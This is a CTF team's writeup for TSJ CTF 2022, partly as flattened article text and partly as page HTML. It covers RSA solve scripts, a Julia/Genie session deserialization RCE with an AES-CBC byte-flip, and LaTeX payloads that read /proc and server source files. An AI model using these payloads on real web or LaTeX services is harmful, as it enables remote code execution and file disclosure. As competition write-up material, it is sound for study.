aes_cbc_encrypt(plaintext=session_id, key=key, iv=iv) session_file = '/app/sessions/' + session_id Seeing AES-CBC is being used, I suspected that there is a padding oracle vulnerability... After that, I deployed an instance locally with key and IV hardcoded. I found that we can set the session ID to be ../uploads/session.txt and it would read my uploaded session.txt as the session content. I drafted an attack flow and get the web guy (the unbeatable Ozetta) involved:\n Upload session.txt with a malicious session that will copy the flag to uploads/session.txt Set the session to point to ../uploads/session.txt Visit the page for the command in the session to execute Go to http://[HOST]/uploads/flag for the flag  By the way, grhkm asked if we could upload a file called ../f early on. I quickly rejected his idea. I was so wrong... More on that later.\nCrafting a malicious session file From Ozetta's perspective\nMystiz et al. found that the session id stored in cookies (__geniesid) is an encrypted filename of the session file in the server. The encryption is using a secret token, which is random whenever the server instance is created:\nGenie.secret_token!(sha256(randstring(256)) | bytes2hex) Apparently we need to specify the __geniesid to point to the file we uploaded to do something interesting. What kind of thing we should do? We found that the sesion file is in a serialized format that starts with \"7JL\": https://docs.julialang.org/en/v1/stdlib/Serialization/ So probably it is some kind of deserialization and trigger RCE like the pickle in python or POP chain in PHP: https://cwe.mitre.org/data/definitions/502.html Let's search for this in Julia and see whether there are some PoCs already. It turns out that there is an issue in GitHub opened since 2019... lol https://github.com/JuliaLang/julia/issues/32601 To test the PoC, we first run the code stated in the issue on the local server, and then replace the session file we found on the local server to the PoC outputed file, and then visit the home page to trigger the session loading. Then we see this in the error log:\nweb_1 | ┌ Error: KeyError(:REQUEST) web_1 | └ @ Genie.AppServer ~/.julia/packages/Genie/drXWm/src/AppServer.jl:120 web_1 | 2022/02/27 15:43:01 [error] 16#16: *6 upstream prematurely closed connection while reading response header from upstream, client: 172.27.0.1, server: , request: \"GET / HTTP/1.1\", upstream: \"http://127.0.0.1:8888/\", host: \"localhost:8888\" web_1 | root:x:0:0:root:/root:/bin/bash web_1 | daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin web_1 | bin:x:2:2:bin:/bin:/usr/sbin/nologin web_1 | sys:x:3:3:sys:/dev:/usr/sbin/nologin ... It works pretty well! Since it only shows the execution result in the error log, probably we need to set up a requestbin to catch the flag after RCE. But to be more convenient to our team members, we can just copy the flag to the uploads folder on the server and then use the native feature to download the flag, so we don't even need external connection lol. Here is the exploit code based on the PoC:\nusing Serialization Serialization.deserialize(s::Serializer, t::Type{BigInt})=run(`sh -c 'cp /app/flag* /app/uploads/flag'`); filt=filter(methods(Serialization.deserialize).ms) do m String(m.file)[1]=='R' end; Serialization.serialize(\"poc.serialized_jl\", (filt[1], BigInt(7))); The only difference is the command. For some reason you cannot directly use special character when you use the run function (or maybe a language construct? I don't even know wtf is that... lol). The special characters need to be quoted. So if you just use cp /app/flag* /app/uploads/flag then it will try to copy the file called flag* instead of the actual flag file with random file name. So we need to use sh -c here.\nAfter that we need to fix the crypto part.\nThe server is slow due to weird behavior of nginx, and it just has 600 seconds timeout.\nFinding the actual crypto bug From Mystiz's perspective\nI thought it was a padding oracle, but it is not. Let's read the source code on how a session ID is converted to a cookie:\n# https://github.com/GenieFramework/Genie.jl/blob/v4.15.2/src/session_adapters/FileSession.jl#L68-L89 \"\"\" read(session_id::Union{String,Symbol}) :: Union{Nothing,Genie.Sessions.Session} read(session::Genie.Sessions.Session) :: Union{Nothing,Genie.Sessions.Session} Attempts to read from file the session object serialized as `session_id`. \"\"\" function read(session_id::Union{String,Symbol}) :: Union{Nothing,Genie.Sessions.Session} isfile(joinpath(SESSIONS_PATH, session_id)) || return nothing try open(joinpath(SESSIONS_PATH, session_id), \"r\") do (io) Serialization.deserialize(io) end catch ex @error \"Can't read session\" @error ex end end function read(session::Genie.Sessions.Session) :: Union{Nothing,Genie.Sessions.Session} read(session.id) end# https://github.com/GenieFramework/Genie.jl/blob/v4.15.2/src/Sessions.jl#L59-L71 \"\"\" id(payload::Union{HTTP.Request,HTTP.Response}) :: String Attempts to retrieve the session id from the provided `payload` object. If that is not available, a new session id is created. \"\"\" function id(payload::Union{HTTP.Request,HTTP.Response}) :: String (Genie.Cookies.get(payload, Genie.config.session_key_name) !== nothing) \u0026\u0026 ! isempty(Genie.Cookies.get(payload, Genie.config.session_key_name)) \u0026\u0026 return Genie.Cookies.get(payload, Genie.config.session_key_name) id() end# https://github.com/GenieFramework/Genie.jl/blob/v4.15.2/src/Cookies.jl#L28-L42 \"\"\" get(res::HTTP.Response, key::Union{String,Symbol}) :: Union{Nothing,String} Retrieves a value stored on the cookie as `key` from the `Respose` object. # Arguments - `payload::Union{HTTP.Response,HTTP.Request}`: the request or response object containing the Cookie headers - `key::Union{String,Symbol}`: the name of the cookie value - `encrypted::Bool`: if `true` the value stored on the cookie is automatically decrypted \"\"\" function get(res::HTTP.Response, key::Union{String,Symbol}; encrypted::Bool = true) :: Union{Nothing,String} (haskey(HTTPUtils.Dict(res), \"Set-Cookie\") || haskey(HTTPUtils.Dict(res), \"set-cookie\")) ? nullablevalue(res, key, encrypted = encrypted) : nothing end# https://github.com/GenieFramework/Genie.jl/blob/v4.15.2/src/Cookies.jl#L135-L157 \"\"\" nullablevalue(payload::Union{HTTP.Response,HTTP.Request}, key::Union{String,Symbol}; encrypted::Bool = true) Attempts to retrieve a cookie value stored at `key` in the `payload object` and returns a `Union{Nothing,String}` # Arguments - `payload::Union{HTTP.Response,HTTP.Request}`: the request or response object containing the Cookie headers - `key::Union{String,Symbol}`: the name of the cookie value - `encrypted::Bool`: if `true` the value stored on the cookie is automatically decrypted \"\"\" function nullablevalue(payload::Union{HTTP.Response,HTTP.Request}, key::Union{String,Symbol}; encrypted::Bool = true) :: Union{Nothing,String} for cookie in split(Dict(payload)[\"cookie\"], ';') cookie = strip(cookie) if startswith(lowercase(cookie), lowercase(string(key))) value = split(cookie, '=')[2] | String encrypted \u0026\u0026 (value = Genie.Encryption.decrypt(value)) return string(value) end end nothing end# https://github.com/GenieFramework/Genie.jl/blob/v4.15.2/src/Encryption.jl#L24-L35 \"\"\" decrypt(s::String) :: String Decrypts `s` (a `string` previously encrypted by Genie). \"\"\" function decrypt(s::String) :: String (key32, iv16) = encryption_sauce() decryptor = Nettle.Decryptor(ENCRYPTION_METHOD, key32) deciphertext = Nettle.decrypt(decryptor, :CBC, iv16, s | hex2bytes) String(Nettle.trim_padding_PKCS5(deciphertext)) end# https://github.com/JuliaCrypto/Nettle.jl/blob/v0.5.0/src/cipher.jl#L90-L93 function trim_padding_PKCS5(data::Vector{UInt8}) padlen = data[sizeof(data)] return data[1:sizeof(data)-padlen] end In short, __geniesid is the ciphertext of the relative path for the session file. It uses the decryptor from Nettle.jl to decrypt ciphertext with AES-CBC and unpad. Notably, Nettle.jl's unpad it reads the last character (denoted by $\\rho$) and simply remove the last $\\rho$ characters from the plaintext. It does not checks if the padding is correct under PKCS5.\nSince the session ID is 64 characters long, the ciphertext would be 80 bytes long. In particular, if $c_4$ and $c_5$ represents the fourth and the fifth blocks and $\\text{pad}$ is 10 10 ... 10, we have:\n\\[\\text{Enc}(c_4 \\oplus \\text{pad}) = c_5\\]\nIf we flip the last byte of $c_4$ by 0x10 XOR 0x4f, we would obtain a plaintext which is the first byte of the current plaintext. After all, we have the following algorithm:\n Upload 16 malicious sessions to ../uploads/0, ../uploads/1, ..., ../uploads/f (yes, @grhkm was correct.) Get a session and flip the last byte of $c_4$ by 0x5f = 0x10 XOR 0x4f. We then have the session ID being 0, 1, ..., or f, which will point to the malicious session. Use the malicious session and visit a page. Read the flag at http://[HOST]/uploads/flag  I will write a blog post on the cryptographic details later.  Remote Code TeXecution 1 Solved by harrier and Ozetta; writeup compiled by Ozetta.\nWhen I was attempting this challenge, the source code was not released.\nFew months ago some of our team member added a Discord Bot called \"TeXit\" to render LaTeX output on Discord... lol it just looks too similar to the current challenge. A day after the Bot is introduced, I managed to craft a payload that can read any files on the server and steal other user's output. The bug is reported to the developers of TeXit and they replied that it is an expected behavior. Well looks like we have some endowment to use for this challenge:\n\\makeatletter \\def\\protected@iwrite#1#2#3{% \\begingroup\\set@display@protect #2% local assignments \\immediate\\write#1{#3}\\endgroup} \\newwrite\\tempfile \\immediate\\openout\\tempfile=z.tex \\protected@iwrite\\tempfile{}{\\protect\\begin{verbatim}} \\newread\\file \\openin\\file=../(Discord_User_ID)/(Discord_User_ID).tex \\newcount\\foo \\foo=0 \\loop\\unless\\ifeof\\file \\advance \\foo +1 \\read\\file to\\fileline \\ifnum \\foo  53 \\protected@iwrite\\tempfile{}{\\fileline} \\fi \\repeat \\closein\\file The funny 53 is to remove the headers added by the Bot, and we will see later on that it is very useful in this challenge. So I just replace the filename in our old payload to check /proc/self/stat. It shows\nError The bot thinks your file is insecure backslash detected! I also tried /proc/self/exe and it shows\nCompilation failed ! Text line contains an invalid character. ^^? ELF^^B^^A^^A^^@^^@^^@^^@^^@^^@^^@^^@^^@^^C^^@^^@^^A^^@^^@^^@@!^... l.21 \\repeat ? ! Emergency stop. ^^? ELF^^B^^A^^A^^@^^@^^@^^@^^@^^@^^@^^@^^@^^C^^@^^@^^A^^@^^@^^@@!^... l.21 \\repeat ! == Fatal error occurred, no output PDF file produced! Transcript written on output.log. Output PDF not found. And /proc/self/cmdline shows\n! Text line contains an invalid character. pdflatex^^@ -no-shell-escape^^@-jobname^^@output^^@__document.tex^^@ l.21 \\repeat ? ! Emergency stop. pdflatex^^@ -no-shell-escape^^@-jobname^^@output^^@__document.tex^^@ l.21 \\repeat ! == Fatal error occurred, no output PDF file produced! Transcript written on output.log. Output PDF not found. Thanks it is pdflatex, I should know that already based on the experience from TeXit.\nLooks like it only got output whenever there is an error. So those verbatim tricks from the old payload didn't work well. I just left the challenge alone and after the author released a hint about procfs, probably we are still on the right track... Then after that I found a shit way to force the error output:\n\\PackageError{mypackage}{\\fileline}{asdf}\nSo instead of writing to a tempfile, we can throw exception like this to see the output. I am too lazy so I just add one extra line like this lol:\n\\makeatletter \\def\\protected@iwrite#1#2#3{% \\begingroup\\set@display@protect #2% local assignments \\immediate\\write#1{#3}\\endgroup} \\newwrite\\tempfile \\immediate\\openout\\tempfile=z.tex \\newread\\file \\openin\\file=/proc/self/stat \\newcount\\foo \\foo=0 \\loop\\unless\\ifeof\\file \\advance \\foo +1 \\read\\file to\\fileline \\ifnum \\foo  0 \\PackageError{zzz}{\\fileline}{xxx} \\protected@iwrite\\tempfile{}{\\fileline} \\fi \\repeat \\closein\\file \\immediate\\closeout\\tempfile \\input{z.tex} Reading /proc/self/stat gives this:\n! Package zzz Error: 16150 (pdflatex) R 16149 16145 16145 0 -1 4194560 4455 0 0 0 6 0 0 0 20 0 1 0 14499616 104087552 5380 18446744073709551615 94604983250944 94604984547965 140730182785440 0 0 0 0 0 2 0 0 0 17 3 0 0 0 0 0 94604984940784 94604985236168 94605006471168 140730182790653 140730182790710 140730182790710 140730182791142 0 . I guess there is a script that spawns the pdflatex, so reading the parent process' cmdline should shows the source path. Upload another file and render again gives another pid that is 11 more than the previous one. So let's say we have pid 16150 for /proc/self/stat (from the previous example), we should leak /proc/16160/cmdline to see the source code path. Then this is what we get:\n! Text line contains an invalid character. /bin/sh^^@ -c^^@pdflatex -no-shell-escape -jobname output __document... l.21 \\repeat Thanks it is /bin/sh! Should we find the flag inside? lol Then we check the parent process' id of that sh(it):\n! Package zzz Error: 16292 (sh) S 16290 16288 16288 0 -1 4194304 68 0 0 0 0 0 0 0 20 0 1 0 14551347 2478080 128 18446744073709551615 94814411878400 9481441195 3821 140730404898032 0 0 0 0 0 65538 1 0 0 17 4 0 0 0 0 0 94814411984688 948144 11989568 94814436925440 140730404900389 140730404900477 140730404900477 1407304 04900848 0 . Got a difference of 2, so next time maybe just 11-1-2 = 8, which actually gives this shit:\n/usr/bin/make^^@ -s^^@-C^^@sandbox/ffdb9e807e2ef8fd656b_236028595565... l.21 \\repeat Haiya why not just brute force... ok the difference is 9:\n! Text line contains an invalid character. python3^^@ /workdir/YVvIaGD52z09nIZzXzvB.py^^@ l.21 \\repeat Finally we got the source code's path. Then to leak the source code (well I am not aware of the source code is released by the author at the moment), we can do it line by line... But I don't want so I just copied a string concat macro:\n\\makeatletter \\def\\protected@iwrite#1#2#3{% \\begingroup\\set@display@protect #2% local assignments \\immediate\\write#1{#3}\\endgroup} \\def\\mystring{} % initialize \\def\\extendmystring#1#2{\\edef\\mystring{#1\\mystring#2}} \\newwrite\\tempfile \\immediate\\openout\\tempfile=z.tex \\newread\\file \\openin\\file=/workdir/YVvIaGD52z09nIZzXzvB.py \\newcount\\foo \\foo=0 \\loop\\unless\\ifeof\\file \\advance \\foo +1 \\read\\file to\\fileline \\ifnum \\foo  0 \\ifnum \\foo  so the output should be a FUCK-separated text of the source code. And I keep requesting the Bot to leak the source code for about 20 lines at a time. Then the single quotes on lines 23 and 44 break the output. So I have to skip these lines manually. Finally I got a different error message from line 171, so looks like it is EOF? Or the # comment character breaks the output again. Then I went back to the team Discord channel to see what's going on and found that our team member harrier has already found the flag on line 171 quickly by viewing the released code.\nHere is the final payload to fix the #, using the catcode command to change the category of # char to be \"other\" so it doesnt get rendered badly:\n\\makeatletter \\def\\protected@iwrite#1#2#3{% \\begingroup\\set@display@protect #2% local assignments \\immediate\\write#1{#3}\\endgroup} \\def\\mystring{} % initialize \\def\\extendmystring#1#2{\\edef\\mystring{#1\\mystring#2}} \\catcode`\\#=12 \\newwrite\\tempfile \\immediate\\openout\\tempfile=z.tex \\newread\\file \\openin\\file=/workdir/YVvIaGD52z09nIZzXzvB.py \\newcount\\foo \\foo=0 \\loop\\unless\\ifeof\\file \\advance \\foo +1 \\read\\file to\\fileline \\ifnum \\foo  170 \\ifnum \\foo  lol why you still need to write a tempfile...\n",
+  "wordCount" : "5892",
+  "inLanguage": "en",
+  "image":"https://b6a.black/images/2022-03-03-tsjctf/tsjctf.jpg","datePublished": "2022-03-06T00:00:00+08:00",
+  "dateModified": "2022-03-06T00:00:00+08:00",
+  "author":[{
+    "@type": "Person",
+    "name": "grhkm"
+  }, {
+    "@type": "Person",
+    "name": "harrier"
+  }, {
+    "@type": "Person",
+    "name": "Mystiz"
+  }, {
+    "@type": "Person",
+    "name": "ozetta"
+  }],
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://b6a.black/posts/2022-03-03-tsjctf/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Black Bauhinia",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://b6a.black/favicon.ico"
+    }
+  }
+}
+</script>
+
+
+
+</head>
+
+<body class=" dark" id="top">
+<noscript>
+    <style type="text/css">
+        .theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+</noscript>
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://b6a.black/" accesskey="h" title="Black Bauhinia (Alt + H)">Black Bauhinia</a>
+            <span class="logo-switches">
+                
+                
+            </span>
+        </div>
+        <ul id="menu" onscroll="menu_on_scroll()">
+            <li>
+                <a href="https://b6a.black/about-us/" title="About Us">
+                    <span>About Us</span>
+                </a>
+            </li></ul>
+    </nav>
+</header>
+
+    <main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+
+    <h1 class="post-title">
+      TSJ CTF 2022 Writeup
+    </h1>
+    <div class="post-meta">
+
+March 6, 2022&nbsp;·&nbsp;grhkm, harrier, Mystiz, ozetta
+
+</div>
+  </header>
+  
+  
+  <div class="post-content js-toc-content">
+<p>We played TSJ CTF last weekend and we won! This is the writeups of our challenges:</p>
+
+
+  <figure class="center" >
+    <img src="/images/2022-03-03-tsjctf/scoreboard.jpeg"   />
+    
+  </figure>
+
+
+
+<table>
+<thead>
+<tr>
+<th>Challenge Name</th>
+<th>Category</th>
+<th>Points</th>
+<th>Writeup</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>Futago</td>
+<td>CSC, Crypto</td>
+<td>56</td>
+<td><a href="#futago">Link</a></td>
+</tr>
+
+<tr>
+<td>Completely Secure Cryptography</td>
+<td>CSC, Misc</td>
+<td>116</td>
+<td><a href="#completely-secure-cryptography">Link</a></td>
+</tr>
+
+<tr>
+<td>Nimja at Nantou</td>
+<td>Web</td>
+<td>133</td>
+<td><a href="#nimja-at-nantou">Link</a></td>
+</tr>
+
+<tr>
+<td>babyRSA</td>
+<td>Crypto</td>
+<td>276</td>
+<td><a href="#babyrsa">Link</a></td>
+</tr>
+
+<tr>
+<td>Top Secret</td>
+<td>Crypto</td>
+<td>325</td>
+<td><a href="#top-secret">Link</a></td>
+</tr>
+
+<tr>
+<td>Cipher Switching Service</td>
+<td>Crypto</td>
+<td>416</td>
+<td><a href="#cipher-switching-service">Link</a>, <a href="https://mystiz.hk/posts/2022-03-01-tsjctf-1/">Mystiz's blog</a></td>
+</tr>
+
+<tr>
+<td>Signature</td>
+<td>Crypto</td>
+<td>469</td>
+<td><a href="#signature">Link</a>, <a href="https://mystiz.hk/posts/2022-03-02-tsjctf-2/">Mystiz's blog</a></td>
+</tr>
+
+<tr>
+<td>RNG++</td>
+<td>Crypto</td>
+<td>213</td>
+<td><a href="#rng">Link</a></td>
+</tr>
+
+<tr>
+<td>RNG+++</td>
+<td>Crypto</td>
+<td>469</td>
+<td><a href="#rng-1">Link</a></td>
+</tr>
+
+<tr>
+<td>Genie</td>
+<td>Web, Crypto</td>
+<td>500</td>
+<td><a href="#genie">Link</a></td>
+</tr>
+
+<tr>
+<td>Remote Code TeXecution 1</td>
+<td>Misc</td>
+<td>500</td>
+<td><a href="#remote-code-texecution-1">Link</a></td>
+</tr>
+</tbody>
+</table>
+
+<h2 id="futago">Futago<a hidden class="anchor" aria-hidden="true" href="#futago">#</a></h2>
+
+<p><em>Solved by Mystiz and grhkm; writeup compiled by grhkm.</em></p>
+
+<p>We are given three different folders, each containing RSA challenges which we shall solve to get the full flag. Firstly, here is how to read the <code>.pub</code> files in Python:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> Crypto.PublicKey <span style="color:#f92672">import</span> RSA
+
+key <span style="color:#f92672">=</span> RSA<span style="color:#f92672">.</span>import_key(open(<span style="color:#e6db74">&#39;key.pub&#39;</span>, <span style="color:#e6db74">&#39;r&#39;</span>)<span style="color:#f92672">.</span>read())
+print(key<span style="color:#f92672">.</span>n, key<span style="color:#f92672">.</span>e)</code></pre></div>
+<p>With this in mind, let's look at each of the three stages. Note that since this is a CSC challenge, there is quite a bit of guessing involved, but I will try to explain the motivation behind each.</p>
+
+<hr>
+
+<h3 id="stage-1">Stage 1<a hidden class="anchor" aria-hidden="true" href="#stage-1">#</a></h3>
+
+<p>We are given two RSA keys with $n\sim 2^{2048}$ and $e = 65537$, so there is seemingly no obvious attack on the modulus itself. However, we can guess that the modulus $n_1$ and $n_2$ are generated with a shared prime factor i.e. $n_1 = pq_1$ and $n_2 = pq_2$. This way, we can take their $\gcd$ to extract and factorise the modulus.</p>
+
+<p>Relevant code:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> math <span style="color:#f92672">import</span> gcd
+<span style="color:#f92672">from</span> Crypto.Util.number <span style="color:#f92672">import</span> bytes_to_long, long_to_bytes
+
+p <span style="color:#f92672">=</span> gcd(n1, n2)
+q1 <span style="color:#f92672">=</span> n1 <span style="color:#f92672">//</span> p
+q2 <span style="color:#f92672">=</span> n2 <span style="color:#f92672">//</span> p
+
+d1 <span style="color:#f92672">=</span> pow(e1, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, (p <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">*</span> (q1 <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>))
+d2 <span style="color:#f92672">=</span> pow(e2, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, (p <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">*</span> (q2 <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>))
+
+c1 <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#39;flag.txt.key1.enc&#39;</span>, <span style="color:#e6db74">&#39;rb&#39;</span>)<span style="color:#f92672">.</span>read()
+print(long_to_bytes(pow(bytes_to_long(c1), d1, n1))<span style="color:#f92672">.</span>decode())
+<span style="color:#75715e"># Flag: TSJ{just_several_common_rsa_tricks_combined_together_</span>
+
+<span style="color:#75715e"># decrypting flag.txt.key2.enc gives the same flag</span></code></pre></div>
+<p>Note that we have $m_1 = m_2$ for the plaintext</p>
+
+<hr>
+
+<h3 id="stage-2">Stage 2<a hidden class="anchor" aria-hidden="true" href="#stage-2">#</a></h3>
+
+<p>This time, we are given $n_1 = n_2$, $e_1 = 293613$ and $e_2 = 3981$, so</p>
+
+<p><span  class="math">\[\begin{aligned} c_1 &\equiv m^{e_1} \mod pq \\ c_2 &\equiv m^{e_2} \mod pq \end{aligned}\]</span></p>
+
+<p>From this, it is a standard trick to try to find $k_1, k_2$ such that $k_1e_1 + k_2e_2 = 1$ using the extended euclidean algorithm, as that will give</p>
+
+<p><span  class="math">\[c_1^{k_1}c_2^{k_2}\equiv m^{k_1e_1 + k_2e_2}\equiv m\mod pq\]</span></p>
+
+<p>However, here we have $\gcd(e_1, e_2) = 3$, meaning they're not coprime. Therefore, we instead find $k_1, k_2$ such that $k_1e_1 + k_2e_2 = 3$, and $m$ from $m^3$ by taking cube roots in the integers.</p>
+
+<p>Solve script:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> gmpy2
+<span style="color:#f92672">from</span> math <span style="color:#f92672">import</span> gcd
+<span style="color:#f92672">from</span> Crypto.PublicKey <span style="color:#f92672">import</span> RSA
+<span style="color:#f92672">from</span> Crypto.Util.number <span style="color:#f92672">import</span> bytes_to_long, long_to_bytes
+
+<span style="color:#75715e"># import keys</span>
+<span style="color:#f92672">...</span>
+
+<span style="color:#75715e"># solve k1 * e1 + k2 * e2 == 3</span>
+g, k1, k2 <span style="color:#f92672">=</span> gmpy2<span style="color:#f92672">.</span>gcdext(e1, e2)
+<span style="color:#66d9ef">assert</span> g <span style="color:#f92672">==</span> <span style="color:#ae81ff">3</span> <span style="color:#f92672">and</span> k1 <span style="color:#f92672">*</span> e1 <span style="color:#f92672">+</span> k2 <span style="color:#f92672">*</span> e2 <span style="color:#f92672">==</span> g
+
+c1 <span style="color:#f92672">=</span> bytes_to_long(open(<span style="color:#e6db74">&#39;flag.txt.key1.enc&#39;</span>, <span style="color:#e6db74">&#39;rb&#39;</span>)<span style="color:#f92672">.</span>read())
+c2 <span style="color:#f92672">=</span> bytes_to_long(open(<span style="color:#e6db74">&#39;flag.txt.key2.enc&#39;</span>, <span style="color:#e6db74">&#39;rb&#39;</span>)<span style="color:#f92672">.</span>read())
+m3 <span style="color:#f92672">=</span> pow(c1, k1, n1) <span style="color:#f92672">*</span> pow(c2, k2, n1) <span style="color:#f92672">%</span> n1
+m <span style="color:#f92672">=</span> gmpy2<span style="color:#f92672">.</span>iroot(m3, <span style="color:#ae81ff">3</span>)[<span style="color:#ae81ff">0</span>]
+print(long_to_bytes(m)<span style="color:#f92672">.</span>decode())
+<span style="color:#75715e"># Flag: in_a_single_guessy(?)_challenge_</span></code></pre></div>
+<hr>
+
+<h3 id="stage-3">Stage 3<a hidden class="anchor" aria-hidden="true" href="#stage-3">#</a></h3>
+
+<p>Finally, this time we are given two different $2040$-bit modulus $n_1 = 2256\ldots 6353$ and $n_2 = 2256\ldots 3931$, as well as $e_1 = e_2 = 65537$. As you can see, the two modulus are very close. Indeed, we have $|n_2 - n_1| \sim 2^{1031}$. What does this mean? Well, assuming the parameters for $n_1$ is generated &quot;normally&quot;, we will expect that $n_1 = p_1q_1$ where $p_1\sim q_1$, typically with $p_1 &lt; q_1 &lt; 2p_1$. This means that $p_1, q_1$ should be around $2^{1020}$, and $|n_2 - n_1| \sim 2^{11}\cdot p_1$. More specifically, we can write</p>
+
+<p><span  class="math">\[\begin{align*} n_1 &= p\cdot q \\ n_2 &= (p + \epsilon_1)\cdot (q + \epsilon_2) \end{align*}\]</span></p>
+
+<p>Then we can expect that</p>
+
+<p><span  class="math">\[n_2 - n_1 \approx p\epsilon_2 + q\epsilon_1 \approx (\epsilon_1 + \epsilon_2)\cdot p \implies \epsilon_1 + \epsilon_2\approx 2^{11}\]</span></p>
+
+<p>The range is really small and we can simply bruteforce for $\epsilon_i$ and check for a factorisation of $n_2$!</p>
+
+<p>... But wait, how do we check for a factorisation without knowing $p$ and $q$? I got stuck here in-contest but Mystiz reminded me that we have $2$ equations with $2$ unknowns, and we can write a simultaneous equation:</p>
+
+<p><span  class="math">\[\begin{cases} pq &= n_1 \\ \epsilon_2 p + \epsilon_1 q &= n_2 - n_1 - \epsilon_1 \epsilon_2 \end{cases}\]</span></p>
+
+<p>Explicitly, we get $\epsilon_2pq = (n_2 - n_1 - \epsilon_1\epsilon_2)q - \epsilon_1q^2 = \epsilon_2 n_1$</p>
+
+<p>Solve Script:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">for</span> eps1, eps2 <span style="color:#f92672">in</span> itertools<span style="color:#f92672">.</span>product(map(mpz, range(<span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">3000</span>, <span style="color:#ae81ff">2</span>)), repeat<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span>):
+    a <span style="color:#f92672">=</span> eps1
+    b <span style="color:#f92672">=</span> eps1 <span style="color:#f92672">*</span> eps2 <span style="color:#f92672">+</span> n1 <span style="color:#f92672">-</span> n2
+    c <span style="color:#f92672">=</span> eps2 <span style="color:#f92672">*</span> n1
+    det <span style="color:#f92672">=</span> b <span style="color:#f92672">**</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">*</span> a <span style="color:#f92672">*</span> c
+    <span style="color:#66d9ef">if</span> det <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>:
+        <span style="color:#66d9ef">continue</span>
+    root, exact <span style="color:#f92672">=</span> iroot(det, <span style="color:#ae81ff">2</span>)
+    <span style="color:#66d9ef">if</span> exact <span style="color:#f92672">and</span> (<span style="color:#f92672">-</span>b <span style="color:#f92672">+</span> root) <span style="color:#f92672">%</span> (<span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> a) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
+        q1 <span style="color:#f92672">=</span> (<span style="color:#f92672">-</span>b <span style="color:#f92672">+</span> root) <span style="color:#f92672">//</span> (<span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> a)
+        p1 <span style="color:#f92672">=</span> n1 <span style="color:#f92672">//</span> q1
+        <span style="color:#66d9ef">break</span>
+
+d1 <span style="color:#f92672">=</span> invert(e1, (p1 <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">*</span> (q1 <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>))
+c1 <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#39;flag.txt.key1.enc&#39;</span>, <span style="color:#e6db74">&#39;rb&#39;</span>)<span style="color:#f92672">.</span>read()
+print(long_to_bytes(pow(bytes_to_long(c1), d1, n1))<span style="color:#f92672">.</span>decode())
+<span style="color:#75715e"># Flag: and_this_is_just_some_random_string_to_make_the_flag_long_enough_308c8dfa144c4f41c3dfa06b5}</span></code></pre></div>
+<p>Final Flag: <code>TSJ{just_several_common_rsa_tricks_combined_together_in_a_single_guessy(?)_challenge_and_this_is_just_some_random_string_to_make_the_flag_long_enough_308c8dfa144c4f41c3dfa06b5}</code></p>
+
+<h2 id="completely-secure-cryptography">Completely Secure Cryptography<a hidden class="anchor" aria-hidden="true" href="#completely-secure-cryptography">#</a></h2>
+
+<p><em>Solved by Mystiz; writeup compiled by Mystiz.</em></p>
+
+<p>With some time of testing, I found that the output should be generated from:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># &#34;Encrypt&#34;, of course</span>
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">encrypt</span>(m: bytes) <span style="color:#f92672">-&gt;</span> str:
+    c <span style="color:#f92672">=</span> m
+    <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">16</span>):
+        c <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>b64encode(c)
+    <span style="color:#66d9ef">return</span> c<span style="color:#f92672">.</span>decode()<span style="color:#f92672">.</span>upper()</code></pre></div>
+<p>It is observed in two ways:</p>
+
+<ul>
+<li><code>base64.b64decode(b'Vm0w') == b'Vm0'</code>
+
+<ul>
+<li>This implies that the last step should be a &quot;captialize&quot; operation, and there are a bunch of base64-encode going on.</li>
+</ul></li>
+<li>if we encode <code>TSJ</code> for 16 rounds, the prefix of its output and <code>output.txt</code> has the highest similarity (if we are case-insensitive).
+
+<ul>
+<li>Base64 is performed 16 rounds.</li>
+</ul></li>
+</ul>
+
+<p>From this, we can easily guess byte by byte and see how many characters are matched. Doing this greedily doesn't necessarily give us the correct flag, but we can search through the string space by recursion.</p>
+
+<h3 id="solution-script">Solution script<a hidden class="anchor" aria-hidden="true" href="#solution-script">#</a></h3>
